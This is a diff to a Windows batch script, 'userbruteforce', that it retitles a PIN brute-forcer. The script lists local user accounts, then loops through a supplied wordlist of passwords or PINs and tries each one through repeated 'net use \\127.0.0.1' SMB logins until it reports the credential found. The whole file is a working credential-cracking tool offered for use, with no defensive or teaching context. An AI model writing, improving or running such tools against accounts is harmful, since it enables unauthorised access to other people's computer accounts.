@@ -1,13 +1,14 @@
 @echo off
-title userbruteforce - Ebola Man
+title userbruteforce - PIN Brute Force
 setlocal enabledelayedexpansion
 chcp 65001 >nul
+
 :start
 cls
 set error=-
 color F
 set user=""
-set wordlist=""
+set pinlist=""
 echo.
 echo      ___.                 __          _____                           
 echo      \_ ^|_________ __ ___/  ^|_  _____/ ____\___________   ____  ____  
@@ -23,6 +24,7 @@ echo    ║  1. List Users     ║
 echo    ║  2. Bruteforce     ║
 echo    ║  3. Exit           ║
 echo    ╚════════════════════╝
+
 :input
 set /p "=>> " <nul
 choice /c 123 >nul
@@ -49,9 +51,9 @@ echo.
 echo [TARGET USER]
 set /p user=">> "
 echo.
-echo [PASSWORD LIST]
-set /p wordlist=">> "
-if not exist "%wordlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
+echo [PIN LIST]
+set /p pinlist=">> "
+if not exist "%pinlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
 net user %user% >nul 2>&1
 if /I "%errorlevel%" NEQ "0" (
   echo.
@@ -61,29 +63,31 @@ if /I "%errorlevel%" NEQ "0" (
 )
 net use \\127.0.0.1 /d /y >nul 2>&1
 echo.
-for /f "tokens=*" %%a in (%wordlist%) do (
-  set pass=%%a
+for /f "tokens=*" %%a in (%pinlist%) do (
+  set pin=%%a
   call :varset
 )
 echo.
-echo [91m[%error%][0m [97mPassword not found[0m
+echo [91m[%error%][0m [97mPIN not found[0m
 pause >nul
 goto start
 
 :success
 echo.
-echo [92m[+][0m [97mPassword found: %pass%[0m
+echo [92m[+][0m [97mPIN found: %pin%[0m
 net use \\127.0.0.1 /d /y >nul 2>&1
 set user=
-set pass=
+set pin=
 echo.
 pause >nul
 goto start
 
 :varset
-net use \\127.0.0.1 /user:%user% %pass% 2>&1 | find "System error 1331" >nul
-echo [ATTEMPT %count%] [%pass%]
-set /a count=%count%+1
+net use \\127.0.0.1 /user:%user% %pin% >nul 2>&1
 if /I "%errorlevel%" EQU "0" goto success
 net use | find "\\127.0.0.1" >nul
-if /I "%errorlevel%" EQU "0" goto success 
+if /I "%errorlevel%" EQU "0" goto success
+set /a count=%count%+1
+goto :eof
+
+goto start
